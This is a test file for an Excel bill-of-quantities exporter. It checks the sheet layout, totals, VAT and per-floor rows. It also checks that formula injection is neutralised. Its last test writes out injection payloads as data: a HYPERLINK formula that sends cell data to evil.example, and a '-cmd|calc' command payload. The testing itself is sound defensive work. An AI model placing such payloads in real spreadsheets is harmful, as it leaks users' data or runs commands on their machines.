import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import ExcelJS from 'exceljs';
import { describe, expect, it } from 'vitest';
import { DEFAULT_BOQ_TEMPLATE, type BoqLine, type BoqTemplate } from '@kamutan/contracts';
import { toBoqLine } from '../../src/db/boq-docs';
import {
  buildBoqWorkbook,
  CHAPTER_TOTAL,
  CONFIDENCE_TITLE,
  DRAFT_NOTE,
  EVIDENCE_SHEET,
  FLOOR_SHEET,
  GRAND_TOTAL,
  GRAND_TOTAL_VAT,
  MAIN_SHEET,
  NOTES_TITLE,
  sanitizeCell,
  STATUS_TITLE,
  type EvidenceGroup,
} from '../../src/boq/excel';
import { NOAH_FLOORS, noahLines } from '../fixtures/noah-boq';

const template: BoqTemplate = { ...structuredClone(DEFAULT_BOQ_TEMPLATE), updatedAt: null } as BoqTemplate;
const lines = (opts: { allGreen?: boolean } = {}): BoqLine[] => noahLines(opts).map((l) => toBoqLine(l.id, { ...l } as Record<string, unknown>));

async function read(buf: Buffer) {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(buf as unknown as ArrayBuffer);
  return wb;
}

/** Rows as arrays of display values (formula cells → {formula}). */
function rowsOf(ws: ExcelJS.Worksheet): unknown[][] {
  const out: unknown[][] = [];
  ws.eachRow({ includeEmpty: true }, (row, n) => {
    const vals: unknown[] = [];
    for (let c = 1; c <= ws.columnCount; c++) vals.push(row.getCell(c).value);
    out[n - 1] = vals;
  });
  return out;
}

const findRow = (ws: ExcelJS.Worksheet, pred: (r: ExcelJS.Row) => boolean): ExcelJS.Row | undefined => {
  let hit: ExcelJS.Row | undefined;
  ws.eachRow((r) => {
    if (!hit && pred(r)) hit = r;
  });
  return hit;
};
const rowWithCode = (ws: ExcelJS.Worksheet, code: string) => findRow(ws, (r) => r.getCell(1).value === code);
const rowWithText = (ws: ExcelJS.Worksheet, text: string, col = 2) => findRow(ws, (r) => r.getCell(col).value === text);

describe('sanitizeCell (SEC-39)', () => {
  it.each(['=HYPERLINK("http://x","y")', '+972', '-1', '@SUM(A1)', '\tx', '\rx'])('prefixes %j', (s) => {
    expect(sanitizeCell(s).startsWith("'")).toBe(true);
  });
  it('leaves normal text alone and drops control chars', () => {
    expect(sanitizeCell('שקע כפול')).toBe('שקע כפול');
    expect(sanitizeCell('4.10')).toBe('4.10');
    expect(sanitizeCell('a\u0000b\u0007c')).toBe('abc');
    expect(sanitizeCell('\u0000=1')).toBe("'=1");
  });
});

describe('buildBoqWorkbook — client format (sample BOQ chapter 04 + 9.01)', () => {
  const evidence = new Map<string, EvidenceGroup[]>([
    ['bl_4_10', [{ sheet: 'תאורה קומת קרקע', floor: 'קומת קרקע', count: 3 }, { sheet: "תאורה קומה א'", floor: "קומה א'", count: 2 }]],
    ['bl_4_11', [{ sheet: 'תאורה', floor: 'ground', count: 2, linkGroups: [{ id: 'lk_1', switchIds: ['d_1'], pointIds: ['pt_1', 'pt_2'] }, { id: 'lk_2', switchIds: [], pointIds: [] }] }]],
  ]);

  it('main sheet: RTL, title rows, header, chapters + notes, codes as TEXT, empty prices + formulas, confidence/status, totals', async () => {
    const buf = await buildBoqWorkbook({ projectName: 'בית משפחת נח, גני תקווה', date: new Date('2026-10-14T10:00:00Z'), template, lines: lines(), split: 'summed', markDraft: false, evidence });
    const out = process.env.EXPORT_FIXTURE_SAMPLE_PATH ?? join(tmpdir(), 'kamutan-export-fixture.xlsx');
    mkdirSync(dirname(out), { recursive: true });
    writeFileSync(out, buf);

    const wb = await read(buf);
    expect(wb.worksheets.map((w) => w.name)).toEqual([MAIN_SHEET, FLOOR_SHEET, EVIDENCE_SHEET]);
    const ws = wb.getWorksheet(MAIN_SHEET) as ExcelJS.Worksheet;
    for (const w of wb.worksheets) expect(w.views[0]?.rightToLeft).toBe(true);

    // warning row first (non-green lines exist), then the template title rows
    const rows = rowsOf(ws);
    expect(String(rows[0]?.[0])).toContain('שורות "לבדיקה"');
    expect(String(rows[0]?.[0])).toContain('1 שורות "לבדיקה" ו-13 שורות "סביר"');
    expect(rows[1]?.[0]).toBe('כתב כמויות ומחירים');
    expect(rows[2]?.[0]).toBe('שם הפרויקט: בית משפחת נח, גני תקווה');
    const header = rows[3];
    expect(header).toEqual(['סעיף', 'תאור העבודה', 'יחידה', 'כמות סה"כ', "מחיר יח'", 'סה"כ ₪', CONFIDENCE_TITLE, STATUS_TITLE]);

    // chapter rows: only chapters with lines, in template order, with notes
    const ch04 = rowWithText(ws, 'פרק 04 – עבודות חשמל') as ExcelJS.Row;
    const ch08 = rowWithText(ws, 'פרק 08- שונות') as ExcelJS.Row;
    expect(ch04).toBeDefined();
    expect(ch08).toBeDefined();
    expect(ch04.number).toBeLessThan(ch08.number);
    expect(rowWithText(ws, 'פרק 01 - עבודות הריסה ופינוי')).toBeUndefined();
    expect(ws.getCell(ch04.number + 1, 2).value).toBe(NOTES_TITLE);
    expect(ws.getCell(ch04.number + 2, 2).value).toBe('1. כל העבודות יבוצעו בהתאם למפרט הסטנדרטי הבין משרדי לעבודות חשמל ע"י חשמלאי מוסמך.');

    // code 4.10 is a TEXT cell; 4.00 keeps its trailing zeros; natural order 4.09 < 4.10 < 4.11
    const r410 = rowWithCode(ws, '4.10') as ExcelJS.Row;
    expect(r410.getCell(1).type).toBe(ExcelJS.ValueType.String);
    expect(r410.getCell(1).numFmt).toBe('@');
    expect(rowWithCode(ws, '4.00')).toBeDefined();
    expect((rowWithCode(ws, '4.09') as ExcelJS.Row).number).toBeLessThan(r410.number);
    expect(r410.number).toBeLessThan((rowWithCode(ws, '4.11') as ExcelJS.Row).number);
    expect(r410.getCell(2).value).toBe("נק' מאור בעלת שני מפסקים מחליפים");
    expect(r410.getCell(3).value).toBe('יחידה');
    expect(r410.getCell(4).value).toBe(2);
    expect(r410.getCell(5).value).toBeNull(); // price empty
    expect(r410.getCell(6).formula).toBe(`D${r410.number}*E${r410.number}`);
    expect(r410.getCell(7).value).toBe('סביר');
    expect(r410.getCell(8).value).toBe('טיוטה');
    expect((rowWithCode(ws, '4.12') as ExcelJS.Row).getCell(7).value).toBe('לבדיקה');
    expect((rowWithCode(ws, '4.00') as ExcelJS.Row).getCell(7).value).toBe('מאומת');
    expect((rowWithCode(ws, '4.09') as ExcelJS.Row).getCell(8).value).toBe('נבדק');
    expect((rowWithCode(ws, '4.18') as ExcelJS.Row).getCell(8).value).toBe('אושר');
    expect((rowWithCode(ws, '9.01') as ExcelJS.Row).getCell(4).value).toBe(43);
    expect((rowWithCode(ws, '9.01') as ExcelJS.Row).number).toBeGreaterThan(ch08.number);

    // chapter "סה"כ" rows with SUM formulas, grand totals with VAT
    const first04 = (rowWithCode(ws, '4.00') as ExcelJS.Row).number;
    const last04 = (rowWithCode(ws, '4.28') as ExcelJS.Row).number;
    const tot04 = ws.getRow(last04 + 1);
    expect(tot04.getCell(2).value).toBe(CHAPTER_TOTAL);
    expect(tot04.getCell(6).formula).toBe(`SUM(F${first04}:F${last04})`);
    const grand = rowWithText(ws, GRAND_TOTAL) as ExcelJS.Row;
    expect(grand.getCell(6).formula).toMatch(/^SUM\(F\d+,F\d+\)$/);
    const vat = rowWithText(ws, GRAND_TOTAL_VAT) as ExcelJS.Row;
    expect(vat.getCell(6).formula).toBe(`F${grand.number}*(1+0.18)`);
    // currency format of the sample on price / total cells and totals
    // written as `"₪"\ #,##0` (styles.xml); exceljs drops the escape when reading back
    for (const c of [r410.getCell(5), r410.getCell(6), vat.getCell(6)]) expect(c.numFmt).toMatch(/^"₪"\\? #,##0$/);

    // every line of the fixture is present exactly once
    const codes: string[] = [];
    ws.eachRow((r) => {
      const v = r.getCell(1).value;
      if (typeof v === 'string' && /^\d+\.\d+$/.test(v)) codes.push(v);
    });
    expect(codes).toHaveLength(29);
    expect(new Set(codes).size).toBe(29);

    // "פירוט לפי קומה": floors as columns, SUM formula, final quantity
    const fs = wb.getWorksheet(FLOOR_SHEET) as ExcelJS.Worksheet;
    const fh = rowsOf(fs)[0] as unknown[];
    expect(fh.slice(3, 3 + NOAH_FLOORS.length)).toEqual(NOAH_FLOORS);
    const f400 = rowWithCode(fs, '4.00') as ExcelJS.Row;
    expect(f400.getCell(4).value).toBe(7);
    expect(f400.getCell(7).formula).toBe(`SUM(D${f400.number}:F${f400.number})`);
    expect(f400.getCell(8).value).toBe(23);

    // "ראיות": line → sheet / floor / count
    const ev = wb.getWorksheet(EVIDENCE_SHEET) as ExcelJS.Worksheet;
    const evRows = rowsOf(ev).filter((r) => r?.[0] === '4.10');
    expect(evRows).toEqual([
      ['4.10', "נק' מאור בעלת שני מפסקים מחליפים", 'תאורה קומת קרקע', 'קומת קרקע', 3, 'שיוך לפריט לפי כלל ברירת מחדל', null, null],
      ['4.10', "נק' מאור בעלת שני מפסקים מחליפים", "תאורה קומה א'", "קומה א'", 2, null, null, null],
    ]);
    const r411 = rowsOf(ev).find((r) => r?.[0] === '4.11') as unknown[];
    expect(r411.slice(3, 5)).toEqual(['קומת קרקע', 2]);
    expect(r411[7]).toBe('lk_1: מפסקים d_1 → נקודות pt_1, pt_2\nlk_2: מפסקים — → נקודות —');
  });

  it('VAT from the org setting; worker floor codes shown with Hebrew names (project names win)', async () => {
    const ls = lines().map((l) => ({ ...l, byFloor: { basement: 1, ground: 2, first: 3 } }));
    const wb = await read(
      await buildBoqWorkbook({ projectName: 'P', date: new Date(), template, lines: ls, split: 'byFloor', markDraft: false, evidence: new Map(), vatRate: 0.17, floorNames: { first: 'קומת מגורים' } }),
    );
    const ws = wb.getWorksheet(MAIN_SHEET) as ExcelJS.Worksheet;
    expect((rowWithText(ws, GRAND_TOTAL_VAT) as ExcelJS.Row).getCell(6).formula).toMatch(/\*\(1\+0\.17\)$/);
    expect(rowWithText(ws, 'שקע בודד – מרתף')).toBeDefined();
    expect(rowWithText(ws, 'שקע בודד – קומת מגורים')).toBeDefined();
    const fh = rowsOf(wb.getWorksheet(FLOOR_SHEET) as ExcelJS.Worksheet)[0] as unknown[];
    expect(fh.slice(3, 6)).toEqual(['מרתף', 'קומת קרקע', 'קומת מגורים']);
  });

  it('no warning row when every line is green; markDraft adds the draft title row', async () => {
    const wb = await read(await buildBoqWorkbook({ projectName: 'P', date: new Date(), template, lines: lines({ allGreen: true }), split: 'summed', markDraft: true, evidence: new Map() }));
    const rows = rowsOf(wb.getWorksheet(MAIN_SHEET) as ExcelJS.Worksheet);
    expect(rows[0]?.[0]).toBe('כתב כמויות ומחירים');
    expect(rows[2]?.[0]).toBe(DRAFT_NOTE);
    expect(rows[3]?.[0]).toBe('סעיף');
  });

  it('byFloor split: one row per floor, override kept as a single row with a note', async () => {
    const ls = lines();
    const l = ls.find((x) => x.code === '4.01') as BoqLine;
    l.qtyOverride = 14;
    l.qtyOverrideReason = 'ספירה ידנית';
    const wb = await read(await buildBoqWorkbook({ projectName: 'P', date: new Date(), template, lines: ls, split: 'byFloor', markDraft: false, evidence: new Map() }));
    const ws = wb.getWorksheet(MAIN_SHEET) as ExcelJS.Worksheet;
    const r400: ExcelJS.Row[] = [];
    ws.eachRow((r) => r.getCell(1).value === '4.00' && r400.push(r));
    expect(r400.map((r) => r.getCell(2).value)).toEqual(['שקע בודד – מרתף', 'שקע בודד – קומת קרקע', "שקע בודד – קומה א'"]);
    expect(r400.map((r) => r.getCell(4).value)).toEqual([7, 9, 7]);
    const r401: ExcelJS.Row[] = [];
    ws.eachRow((r) => r.getCell(1).value === '4.01' && r401.push(r));
    expect(r401).toHaveLength(1);
    expect(r401[0]?.getCell(4).value).toBe(14);
    expect(String(r401[0]?.getCell(4).note)).toContain('כמות שונתה ידנית');
  });

  it('formula injection from OCR / user text is neutralised in every sheet', async () => {
    const evil = '=HYPERLINK("http://evil.example/?"&A1,"click")';
    const ls = lines({ allGreen: true });
    ls[0] = { ...(ls[0] as BoqLine), description: evil, unit: '+1', reasons: ['@SUM(1)'] };
    const tpl = { ...template, titleRows: ['-cmd|calc', 'שם הפרויקט: {projectName}'], chapters: template.chapters.map((c) => (c.code === '04' ? { ...c, notes: ['=1+1'] } : c)) };
    const wb = await read(
      await buildBoqWorkbook({ projectName: '=evil()', date: new Date(), template: tpl, lines: ls, split: 'summed', markDraft: false, evidence: new Map([[ls[0]?.id as string, [{ sheet: '@sheet', floor: '-x9', count: 1, detectionIds: ['=d_1'] }]]]) }),
    );
    const texts: string[] = [];
    for (const ws of wb.worksheets) {
      ws.eachRow((r) => r.eachCell((c) => {
        if (c.type === ExcelJS.ValueType.String) texts.push(c.value as string);
      }));
    }
    expect(texts).toContain(`'${evil}`);
    expect(texts).toContain("'+1");
    expect(texts).toContain("'-cmd|calc");
    expect(texts).toContain('שם הפרויקט: =evil()'); // substituted inside a row that does not start with "="
    expect(texts).toContain("'=1+1");
    expect(texts).toContain("'@SUM(1)");
    expect(texts).toContain("'@sheet");
    expect(texts).toContain("'-x9");
    expect(texts).toContain("'=d_1");
    for (const s of texts) expect(/^[=+\-@\t\r]/.test(s), s).toBe(false);
    // the only formulas are ours (totals)
    const ws = wb.getWorksheet(MAIN_SHEET) as ExcelJS.Worksheet;
    ws.eachRow((r) => r.eachCell((c) => {
      if (c.type === ExcelJS.ValueType.Formula) expect(c.formula).toMatch(/^(SUM\(|[A-Z]+\d+\*)/);
    }));
  });
});
